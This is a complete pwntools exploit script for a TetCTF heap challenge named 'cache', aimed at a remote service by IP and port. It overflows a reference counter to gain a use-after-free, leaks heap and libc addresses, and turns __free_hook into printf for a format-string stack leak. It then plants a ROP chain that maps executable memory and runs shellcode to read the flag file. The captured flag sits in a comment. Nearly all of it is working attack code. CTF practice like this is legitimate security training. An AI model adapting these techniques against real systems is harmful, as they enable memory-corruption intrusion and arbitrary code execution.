#!/usr/bin/env python3
from pwn import *


def connect():
    if args.LOCAL:
        return gdb.debug(["./cache.dbg"], api=True)
    else:
        return remote("3.139.106.4", 27025)


FREE_HOOK_OFF = 0x1EEB28
PRINTF_OFF = 0x64E10
MMAP_OFF = 0x11BA20
READ_OFF = 0x111130
SHELLCODE = asm(
    """
mov rax, 2  /* __NR_open */
lea rdi, [rip + path]
mov rsi, 0  /* O_RDONLY */
syscall

mov rdi, rax
mov rax, 0  /* __NR_read */
lea rsi, [rip + buf]
mov rdx, buf_end - buf
syscall

mov rdx, rax
mov rax, 1  /* __NR_write */
mov rdi, 1  /* STDOUT_FILENO */
lea rsi, [rip + buf]
syscall

path: .asciz "/home/cache/flag"
buf: .org $ + 0x100
buf_end:
""",
    arch="amd64",
)


def create_cache(tube, name, size):
    tube.sendlineafter("> ", "1")
    tube.sendlineafter("Cache name: ", name)
    tube.sendlineafter("Size: ", str(size))


def read_from_cache(tube, name, offset, count):
    tube.sendlineafter("> ", "2")
    tube.sendlineafter("Cache name: ", name)
    tube.sendlineafter("Offset: ", str(offset))
    tube.sendlineafter("Count: ", str(count))
    return tube.recvn(count)


def write_to_cache(tube, name, offset, data):
    tube.sendlineafter("> ", "3")
    tube.sendlineafter("Cache name: ", name)
    tube.sendlineafter("Offset: ", str(offset))
    tube.sendlineafter("Count: ", str(len(data)))
    tube.sendafter("Data: ", data)


def erase_cache(tube, name):
    tube.sendlineafter("> ", "4")
    tube.sendlineafter("Cache name: ", name)


def duplicate_cache_times(tube, name, new_name, n):
    aliases = []
    req = ""
    for i in range(n):
        alias = "{}{}".format(new_name, i)
        req += "5\n{}\n{}\n".format(name, alias)
        aliases.append(alias)
    tube.send(req)
    for _ in range(n):
        tube.recvuntil("> ")
        tube.recvuntil("Source cache name: ")
        tube.recvuntil("New cache name: ")
    return aliases


SIZEOF_CACHE = 0x18


def main():
    with connect() as tube:
        if args.LOCAL:
            tube.gdb.Breakpoint("alarm", temporary=True)
            tube.gdb.continue_and_wait()
            tube.gdb.execute("set $rdi = 9999")
            tube.gdb.continue_nowait()
        # BUG: Overflow reference counter.
        # The victim cache will be freed into Tcachebins[idx=0, size=0x20].
        # Make sure buffers go into a different one.
        victim_name = "V" * 15
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            # cache::cache(size_t)
            tube.gdb.Breakpoint("sub_345E", temporary=True)
            tube.gdb.continue_nowait()
        leak_size = 0x800
        create_cache(tube, victim_name, leak_size)
        if args.LOCAL:
            tube.gdb.wait()
            victim_addr = int(tube.gdb.parse_and_eval("$rdi"))
            print("victim_addr = 0x{:x}".format(victim_addr))
            print(tube.gdb.execute("heap bins", to_string=True))
            tube.gdb.continue_nowait()
        guard_name = "G" * 15
        create_cache(tube, guard_name, 0x100)
        victim_aliases = duplicate_cache_times(tube, victim_name, "V" * 12, 256)
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            # cache::release()
            tube.gdb.Breakpoint("sub_369E", temporary=True)
            print(tube.gdb.execute("x/3a 0x{:x}".format(victim_addr), to_string=True))
            print(tube.gdb.execute("heap bins", to_string=True))
            tube.gdb.continue_nowait()
        erase_cache(tube, victim_aliases[0])
        if args.LOCAL:
            tube.gdb.wait()
            assert int(tube.gdb.parse_and_eval("$rdi") == victim_addr)
            victim_refcount = int(
                tube.gdb.parse_and_eval("*(unsigned char *)0x{:x}".format(victim_addr))
            )
            assert victim_refcount == 1
            victim_buf_expr = "*(unsigned long *)0x{:x}".format(victim_addr + 8)
            gdb_victim_buf = int(tube.gdb.parse_and_eval(victim_buf_expr))
            print("(gdb) victim_buf = 0x{:x}".format(gdb_victim_buf))
            print(tube.gdb.execute("heap bins", to_string=True))
            tube.gdb.continue_nowait()
        leak = read_from_cache(tube, victim_name, 0, leak_size)
        """
    00000080  b0 1e 97 ef  cf 55 00 00  00 00 00 00  00 00 00 00  │····│·U··│····│····│
gef➤  x/2a 0x55cfef971ed0
0x55cfef971ed0: 0x55cfef975740  0x7f98ebacbbe0 <main_arena+96>
gef➤  vmmap
0x00007f98eb8e0000 0x00007f98eb905000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.31.so
"""
        victim_buf = struct.unpack("<Q", leak[0x80:0x88])[0] + 0x20
        print("victim_buf = 0x{:x}".format(victim_buf))
        if args.LOCAL:
            assert victim_buf == gdb_victim_buf
        erase_cache(tube, guard_name)
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            print(tube.gdb.execute("heap bins", to_string=True))
            tube.gdb.continue_nowait()
        # Allocate an attacker cache, whose buffer overlaps the victim cache.
        attacker_name = "A" * 15
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            # cache::cache(size_t)
            tube.gdb.Breakpoint("sub_345E", temporary=True)
            tube.gdb.continue_nowait()
        create_cache(tube, attacker_name, SIZEOF_CACHE)
        if args.LOCAL:
            tube.gdb.wait()
            attacker_addr = int(tube.gdb.parse_and_eval("$rdi"))
            print("attacker_addr = 0x{:x}".format(attacker_addr))
            tube.gdb.continue_nowait()
        # Make the victim cache cover the entire address space.
        write_to_cache(
            tube, attacker_name, 0, struct.pack("<QQQ", 0, 0, 0xFFFFFFFFFFFFFFFF)
        )
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            attacked_buf_expr = "*(unsigned long *)0x{:x}".format(attacker_addr + 8)
            gdb_attacker_buf = int(tube.gdb.parse_and_eval(attacked_buf_expr))
            print("(gdb) attacker_buf = 0x{:x}".format(gdb_attacker_buf))
            print(tube.gdb.execute("x/3a 0x{:x}".format(victim_addr), to_string=True))
            tube.gdb.continue_nowait()
        # Get libc address.
        (unsorted,) = struct.unpack(
            "<Q", read_from_cache(tube, victim_name, victim_buf + 8, 8)
        )
        libc = unsorted - 0x1EBBE0
        print("libc = 0x{:x}".format(libc))
        assert libc & 0xFFF == 0
        # free_hook = printf.
        write_to_cache(
            tube,
            victim_name,
            libc + FREE_HOOK_OFF,
            struct.pack("<Q", libc + PRINTF_OFF),
        )
        # Get stack address.
        u_name = "U" * 15
        create_cache(tube, u_name, 0x1000)
        stkidx2pos = 5
        rbp_stackidx = 3
        fmt = "rbp=<%{}$lx>".format(rbp_stackidx + stkidx2pos)
        write_to_cache(tube, u_name, 0, fmt.encode() + b"\x00")
        if args.LOCAL:
            tube.gdb.interrupt_and_wait()
            tube.gdb.execute("break printf if *(char *)$rdi == 'r'")
            tube.gdb.continue_nowait()
        erase_cache(tube, u_name)
        if args.LOCAL:
            tube.gdb.wait()
            print(tube.gdb.execute("x/96a $rsp", to_string=True))
            """
0x7ffc7351e578:	0x55ea0cd88c13 <sub_3BEC+39>	0x55ea0ebb68f0
0x7ffc7351e588:	0x55ea0ebaeed8	0x7ffc7351e5c0
                                ^^^^^^^^^^^^^^
0x7ffc7351e598:	0x55ea0cd888c7 <sub_387A+77>	0x7ffc7351e5e0
0x7ffc7351e5a8:	0x55ea0ebaeed8	0x7ffc7351e610
0x7ffc7351e5b8:	0x55ea0ebaeed8	0x7ffc7351e5e0
0x7ffc7351e5c8:	0x55ea0cd8869a <sub_367A+32>	0x55ea0ebaf920
...
0x7ffc7351e658:	0x55ea0cd88222 <main+88>	0x0
"""
            tube.gdb.continue_nowait()
        tube.recvuntil("rbp=<")
        rbp = int(tube.recvuntil(">")[:-1], 16)
        print("rbp = 0x{:x}".format(rbp))
        retaddr = rbp + 0x98
        print("retaddr = 0x{:x}".format(retaddr))
        # Put the ROP chain at the location of return address to main().
        # It will be triggered when we return to main() from the last write.
        # mmap(addr@rdi, length@rsi, prot@rdx, flags@rcx, int fd@r8, offset@r9)
        # read(fd@rdi, buf@rsi, count@rdx)
        mmap_addr = 0x11110000
        mmap_length = 0x1000
        mmap_prot = 0x7  # PROT_READ | PROT_WRITE | PROT_EXEC
        mmap_flags = 0x32  # MAP_PRIVATE | MAP_FIXED | MAP_ANONYMOUS
        mmap_fd = 0xFFFFFFFF
        mmap_offset = 0
        read_fd = 0  # STDIN_FILENO
        read_buf = mmap_addr
        read_count = mmap_length
        rop = b"".join(
            (
                # 0x4a550: pop rax ; ret
                # 0x1056fe: pop rcx ; pop rbx ; ret
                struct.pack("<QQ", libc + 0x4A550, libc + 0x1056FE),
                # 0x27529: pop rsi ; ret
                struct.pack("<QQ", libc + 0x27529, mmap_offset),
                # 0x81738: mov r9, rsi ; jmp rax
                struct.pack("<Q", libc + 0x81738),
                struct.pack("<QQ", mmap_flags, mmap_fd),
                # 0x11fdaa : mov r8, rbx ; mov rax, r8 ; pop rbx ; ret
                struct.pack("<QQ", libc + 0x11FDAA, 0),
                # 0x162866: pop rdx ; pop rbx ; ret
                struct.pack("<QQQ", libc + 0x162866, mmap_prot, 0),
                # 0x27529: pop rsi ; ret
                struct.pack("<QQ", libc + 0x27529, mmap_length),
                # 0x26b72 : pop rdi ; ret
                struct.pack("<QQ", libc + 0x26B72, mmap_addr),
                struct.pack("<Q", libc + MMAP_OFF),
                # 0x26b72 : pop rdi ; ret
                struct.pack("<QQ", libc + 0x26B72, read_fd),
                # 0x27529: pop rsi ; ret
                struct.pack("<QQ", libc + 0x27529, read_buf),
                # 0x162866: pop rdx ; pop rbx ; ret
                struct.pack("<QQQ", libc + 0x162866, read_count, 0),
                struct.pack("<Q", libc + READ_OFF),
                struct.pack("<Q", read_buf),
            )
        )
        write_to_cache(tube, victim_name, retaddr, rop)
        if args.LOCAL and False:
            # Debug shellcode.
            tube.gdb.interrupt_and_wait()
            tube.gdb.execute("b *0x{:x}".format(libc + READ_OFF))
            tube.gdb.continue_nowait()
        # Avoid sending shellcode alongside ROP, since std::cin may buffer it.
        time.sleep(1)
        # Send shellcode.
        tube.send(SHELLCODE)
        # TetCTF{https://www.youtube.com/watch?v=RYhKUKzD6IQ}
        # mobi: *100*931583613352#
        tube.interactive()


if __name__ == "__main__":
    main()
